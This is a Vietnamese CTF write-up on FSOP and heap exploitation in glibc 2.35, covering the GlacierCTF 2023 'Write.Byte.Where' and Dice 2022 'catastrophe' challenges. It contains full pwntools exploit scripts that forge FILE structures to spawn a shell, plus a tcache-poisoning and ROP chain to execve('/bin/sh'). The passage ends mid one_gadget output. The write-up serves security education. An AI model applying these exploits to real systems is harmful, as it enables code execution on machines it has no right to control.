---
title: writeup-FSOP
date: 2025-02-12 00:00:00 +0800
categories: [pwn]
tags: [FSOP]
author: "kuvee"
layout: post
---

- FSOP là 1 kĩ thuật tấn công cấu trúc của ```IO_FILE``` , có rất nhiều bài viết về kĩ thuật này ở google , ta có thể đọc 1 bài viết bằng tiếng việt ở đây [here](https://hackmd.io/@kyr04i/SkF_A-fnn) ... 

file [here](/assets/files/GlacierCTF.2023.7z)
## Write.Byte.Where


### overview


- đầu tiên nó sẽ mở ```/proc/self/maps``` và in ra , nói 1 chút về ```/proc/self/maps``` , đây là 1 đường dẫn trỏ đến tiến trình hiện tại , nó sẽ in vùng nhớ được ánh xạ bởi ```maps``` , vì vậy ở đây ta có được libc_leak , exe_leak , stack_leakleak

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+Ch] [rbp-14h]
  _QWORD v4[2]; // [rsp+10h] [rbp-10h] BYREF

  v4[1] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v4[0] = 0LL;
  fd = open("/proc/self/maps", 0);
  if ( fd < 0 )
  {
    puts("ERROR opening maps\n");
    exit(1);
  }
  if ( read(fd, proc_self_maps, 0x1000uLL) < 0 )
  {
    puts("ERROR reading from maps\n");
    exit(1);
  }
  close(fd);
  puts(proc_self_maps);
  printf("Here is an extra: %p\n", v4);
  printf("Where: ");
  __isoc99_scanf("%lld", v4);
  getchar();
  printf("What: ");
  __isoc99_scanf("%c", v4[0]);
  getchar();
  puts("Goodbye! (press  Enter  to exit)");
  getchar();
  exit(0);
}
```

- tiếp theo là ta được nhập dũ liệu vào 1 địa chỉ với 1 byte duy nhất , như tên bài thì đây là 1 bài ```write-what-where``` tuy nhiên chỉ write được 1 byte duy nhất và ta cũng nên nhớ rằng ta có tất cả các địa chỉ hữu ích cho việc khai thác

- checksec : chỉ có canary là tắt

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/GlacierCTF.2023$ checksec vuln_patched
[*] '/home/ploi/pwn/FSOP/GlacierCTF.2023/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### exploit

- vậy ta sẽ làm gì với chỉ mỗi 1 byte , ở đây ta sẽ cùng phân tích cách mà ```get_char``` hoạt động , trước hết ta cần biết bố cục của ```_IO_FILE_STRUCT``` :

```cs
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

- ta sẽ phân tích flow của ```get_char``` : 

đầu tiên là sẽ jmp đến ```__uflow``` 

![get_char1](/assets/images/get_char.png)

tiếp theo jmp đến ```_IO_default_uflow``` 

![get_char1](/assets/images/get_char.png)

cuối cùng là call tại [rbp-0x70]

![get_char1](/assets/images/get_char.png)

- ta sẽ cùng xem xét src của ```_IO_file_underflow```

```c
int _IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  . . .

  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      if (fp->_IO_save_base != NULL)
        {
          free (fp->_IO_save_base);
          fp->_flags &= ~_IO_IN_BACKUP;
        }
      _IO_doallocbuf (fp);
    }

  . . .

  _IO_switch_to_get_mode (fp);

  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);

  . . .

  return *(unsigned char *) fp->_IO_read_ptr;
}
```

- ý định của ta ở bài này là sẽ ghi đè dữ liệu của ```_IO_BUF_END``` để mở rộng được bộ đệm hơn nữa trong memory

![here](/assets/images/fsop.png)

- điều gì sẽ xảy ra khi 1 hàm cố gắng đọc từ ```stdin``` , vd như ```get_char``` , là dữ liệu được gửi trên stdin sẽ được đệm trong bộ đệm và chúng tôi sẽ ghi đè lên phần cuối của ```stdin``` và hơn nữa trong bộ nhớ lên đến ```_Io_buf_end```

![here](/assets/images/fsop2.png)

- và vì ở đây ```stdout``` sẽ nằm xa hơn sau ```sdtin```  0xce0 byte , vì vậy ta có thể ghi được ```stdout```

lúc này ```IO_BUF_END``` đã được mở rộgn thành ```0x7fb2a1132764``` và ta đã ghi đè lên phần còn lại của ```stdin```

![kaka](/assets/images/fsop3.png)

- vì vậy trước hết ta cần setup sao cho các dữ liệu quan trọng ở ```stdin``` sẽ không bị phá hủy , những thứ đó sẽ là ```lock``` , ```offset``` , ```wide_data``` , ```_mode```
- ta sẽ ghi dữ liệu ở vị trí ```_cur_column``` + 3 nên sẽ padding thêm 5 bytes , tiếp theo là ```stdfile_0_lock``` ...

- sau khi overwrite struct ```stdin``` thì ta sẽ padding nó đến ```stdout``` và dùng payload của [nobodyisbody](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout)

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))


stdout_lock = libc.address + 0x240710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x000000000014a870 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh'.ljust(8,b'\x00'))  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + bytes(fake)

p.send(payload)
p.interactive()
```

![flagfsop](/assets/images/flagfsop.png)

1 cách khác 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc.symbols['_IO_file_jumps']
stdout = libc.symbols['_IO_2_1_stdout_']
log.info("stdout: " + hex(stdout))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )

payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + FSOP

p.send(payload)
p.interactive()
```

ref : [>=libc2.35](https://hareh4ru.github.io/pwn/2023/11/23/FSOP-for-libc-2.35-and-over.html)



## catastrophe

file [here](/assets/files/dice-2022.7z)
### overview

checksec : full giáp

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022$ checksec catastrophe
[*] '/home/ploi/pwn/FSOP/dice-2022/catastrophe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- ta có 3 option chính ở bài này , ta sẽ cùng nhau đi phân tích nó 

```cs
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 number; // rax

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  while ( 1 )
  {
    print_menu();
    number = get_number();
    if ( number == 4 )
    {
      puts("Bye!");
      exit(0);
    }
    if ( number <= 4 )
    {
      switch ( number )
      {
        case 3uLL:
          op_view();
          goto LABEL_13;
        case 1uLL:
          op_malloc();
          goto LABEL_13;
        case 2uLL:
          op_free();
          goto LABEL_13;
      }
    }
    puts("Invalid choice!");
LABEL_13:
    putchar(10);
  }
}
```

- op-malloc:  ta được input 1 size <=0x200 và malloc , cuối cùng là nhập dữ liệu vào chunk  
```cs
int op_malloc()
{
  __int64 index; // [rsp+0h] [rbp-10h]
  unsigned __int64 size; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  puts("Size?");
  size = get_number();
  if ( !size || size > 0x200 )
    return puts("Interesting...");
  *((_QWORD *)&chonks + index) = malloc(size);
  printf("Enter content: ");
  return (unsigned int)fgets(*((char **)&chonks + index), size, stdin);
}
```

- op_free: nhập 1 idx và free() , ở đây sẽ xảy ra bug ```UAF``` vì không xóa con trỏ

```cs
void op_free()
{
  __int64 index; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  free(*((void **)&chonks + index));
}
```

- op_view: nhập 1 idx và in dữ liệu của chunk[idx]

```cs
int op_view()
{
  __int64 index; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  return puts(*((const char **)&chonks + index));
}
```

- libc được sử dụng ở bài này là 2.35 (không dùng được hook , có tcache và Safe-linking)  , ta có thể xem cách ```safe-linking``` hoạt động ở [here](https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation)  , mặc khác ta cũng không thể overwrite được GOT , vậy cách mà ta suy nghĩ cuối cùng có lẽ là sử dụng ROP_CHAIN trên stack hoặc là ```exit_handle``` hoặc ```overwrite_got_libc``` tuy  nhiên thì ở bài này mình sẽ làm cách 1, vì vậy ta cần phải leak được địa chỉ stack , muốn leak stack thì ta phải leak libc trước để có ```environ``` và ta cũng cần leak heap để bypasss được ```safe-linking```
- trước hết ta cần setup để có được ```libc_address``` và ```heap_address```


```python
for i in range(7): malloc(i,0x100,b'a')

free(0)
view(0)
heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
log.info(f'heap base: {hex(heap_base)}')
```

- tiếp theo ta chỉ việc malloc() lại , 3 chunk tiếp theo sẽ được sử dụng cho kỹ thuật ```house_of_botcake``` , đây là 1 phương pháp tấn công tcache_poisioning nhưng mạnh mẽ hơn , nó sử dụng hợp nhất chunk để tạo ra 1 double free trong tcache , ta có thể đọc ở đây [here](https://4xura.com/pwn/house-of-botcake/)

- ta sẽ malloc 2 chunk 0x100 và 1 chunk để tránh gộp với top chunk , đồng thời ta sẽ free 8 chunk , chunk thứ 8 sẽ đi vào unsorted bin và ta có thể leak libc 

```cs
malloc(0,0x100,b'a')

malloc(7,0x100,b'a')
malloc(8,0x100,b'a')

malloc(9,0x10,b'c')

for i in range(7): free(i)
free(7)
view(7)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
environ = libc.sym.environ
binsh = next(libc.search(b'/bin/sh\x00'))
stdout = libc.address + 0x21a780
log.info(f'libc: {hex(libc.address)}')
log.info(f'environ: {hex(environ)}')
log.info(f'binsh: {hex(binsh)}')
log.info(f'stdout: {hex(stdout)}')
```

- ta có thể thấy nó như sau , lúc này nếu ta free() chunk ở kế tiếp nó , nó sẽ đi tìm chunk free liền kề và 2 thằng này sẽ được hợp nhất với nhau 

```cs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000111      ................         <-- unsortedbin[all][0]
0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc20  0x0000000000000000                              ........
```

- vậy ta sẽ làm được điều gì với điều này ?  

```cs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000221      ........!.......         <-- unsortedbin[all][0]
0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc20  0x0000000000000220      0x0000000000000020       ....... .......
0x5558b5d9cc30  0x0000000000000a63      0x0000000000000000      c...............
0x5558b5d9cc40  0x0000000000000000      0x00000000000203c1      ................         <-- Top chunk
```

ta hãy cùng xem trong bins lúc này , nếu ta malloc lại 1 chunk để lấy chunk entry_tcache ra và tiếp tục free() chunk thứ 8 thì lúc này cả 2 sẽ nằm ở các bin khác nhau đúng chứ? , vì vậy nếu ta malloc 1 chunk ở ```unsorted_bin``` với 1 kích thước vừa đủ , ta hoàn toàn có thể overwrite được ```fd``` của chunk thứ 8 

```cs
pwndbg> bins
tcachebins
0x110 [  7]: 0x5558b5d9c900 —▸ 0x5558b5d9c7f0 —▸ 0x5558b5d9c6e0 —▸ 0x5558b5d9c5d0 —▸ 0x5558b5d9c4c0 —▸ 0x5558b5d9c3b0 —▸ 0x5558b5d9c2a0 ◂— 0
fastbins
empty
unsortedbin
all: 0x5558b5d9ca00 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9ca00
smallbins
empty
largebins
empty
```
- ta thấy lúc này nếu ta yêu cầu malloc với 1 chunk 0x130 , unsorted sẽ cắt 1 phần ra và ta đã ovewrite thành công được fd trong tcache , chú ý là nó sử dụng ```safe-linking``` nên ta cần mã hóa nó bằng cách ```target ^ (heap_base >> 12)```
```cs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000141      ........A.......
0x5558b5d9ca10  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca20  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca30  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca40  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca50  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca60  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca70  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca80  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca90  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9caa0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cab0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cac0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cad0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cae0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9caf0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cb00  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cb10  0x6161616161616161      0x0000000000000111      aaaaaaaa........
0x5558b5d9cb20  0x00007f6be1bb3a1c      0x9966da748f80000a      .:..k.......t.f.         <-- tcachebins[0x110][0/7]
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x00000000000000e1      ................         <-- unsortedbin[all][0]
0x5558b5d9cb50  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
```

- lúc này ta thấy ta đã overwrite thành công ```fd``` trong tcache và nó trỏ đến ```stdout``` , ta sẽ sử dụng ```FSOP``` để leak địa chỉ stack 

```cs
pwndbg> bins
tcachebins
0x110 [  7]: 0x5558b5d9cb20 —▸ 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0x70d466b81
fastbins
empty
unsortedbin
all: 0x5558b5d9cb40 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9cb40
smallbins
empty
largebins
empty
```

- ta thấy được sau khi các hàm được gọi , nó sẽ sử dụng ```putchar``` : 

```cs
 0x7f6eb416ea62 <putchar+98>     mov    rdx, qword ptr [rdi + 0x28]     RDX, [_IO_2_1_stdout_+40] => 0x7f6eb430d208 ◂— 0
   0x7f6eb416ea66 <putchar+102>    movzx  eax, bpl                        EAX => 0xa
   0x7f6eb416ea6a <putchar+106>    cmp    rdx, qword ptr [rdi + 0x30]     0x7f6eb430d208 - 0x7f6eb430d208     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x7f6eb416ea6e <putchar+110>    jb     putchar+161                 <putchar+161>

   0x7f6eb416ea70 <putchar+112>    mov    esi, eax                        ESI => 0xa
 ► 0x7f6eb416ea72 <putchar+114>    call   __overflow                  <__overflow>
        arg0: 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0xfbad1800
        arg1: 0xa

   0x7f6eb416ea77 <putchar+119>    test   dword ptr [rbx], 0x8000
   0x7f6eb416ea7d <putchar+125>    je     putchar+180                 <putchar+180>

   0x7f6eb416ea7f <putchar+127>    add    rsp, 0x18
   0x7f6eb416ea83 <putchar+131>    pop    rbx
   0x7f6eb416ea84 <putchar+132>    pop    rbp
```

- tiếp theo là gọi  ```_IO_do_write```

rdi là stdout , rsi là _IO_write_base , rdx là ```_IO_write_ptr - _IO_write_base```
```cs
 0x7ffff7e1ff3e <_IO_file_overflow+254>    call   _IO_do_write                <_IO_do_write>
        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
        rdx: 1
        rcx: 0xc00


```
- cuối cùng là 
```
 0x7ffff7e1fa5d <_IO_do_write+173>    call   qword ptr [r14 + 0x78]      <_IO_file_write>
        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
        rdx: 1
        rcx: 0xc00
```

- nói chung quá trình chi tiết ta cần đọc ở đây [here](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop) , vậy ta sẽ setup như sau :

```python
payload = flat(
        0xfbad1800,        # flags
        libc.sym.environ,  #_IO_read_ptr
        libc.sym.environ,  #_IO_read_ptr
        libc.sym.environ,  #_IO_write_ptr
        libc.sym.environ,   #_IO_write_base
        libc.sym.environ+8, #_IO_write_ptr
        libc.sym.environ+8, #_IO_write_end
        libc.sym.environ+8, #_IO_buf_base
        libc.sym.environ+8, #_IO_buf_end
        )
```

- vậy ta sẽ ghi đè cấu trúc của ```stdout```  , và free() lại 2 chunk lúc nãy , lúc này ta đã có thể ghi tùy ý , ta sẽ tiếp tục malloc lại chunk có size 0x130 để overwrite ```fd``` của chunk kế tiếp nằm trong tcache

```cs
tcachebins
0x110 [  6]: 0x55ecb48c0b20 ◂— 0x70a2de07f
0x140 [  1]: 0x55ecb48c0a10 ◂— 0
```

- nó sẽ trông như sau: 


```cs
free(1)
free(2)

payload2 = flat(
        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
        )
pop_rsi = libc.address + 0x0000000000126101
pop_rdi = 0x000000000002a3e5
pop_rdx_rbx = libc.address + 0x0000000000090529

input()
payload3 = p64(heap_base+0x78)
payload3 += p64(pop_rsi) + p64(0)
payload3 += p64(pop_rdx_rbx) + p64(0)*2
payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
malloc(5,0x130,payload2)
malloc(6,0x100,b'nothing')
malloc(7,0x100,payload3)
```

- ở đây mình dùng one_gadget ```0xebcf8``` , ta cần setup ```rbp-0x78``` là 1 địa chỉ có thể ghi và ```rsi và rdx là NULL```


```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022/catastrophe/bin$ one_gadget libc.so.6
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
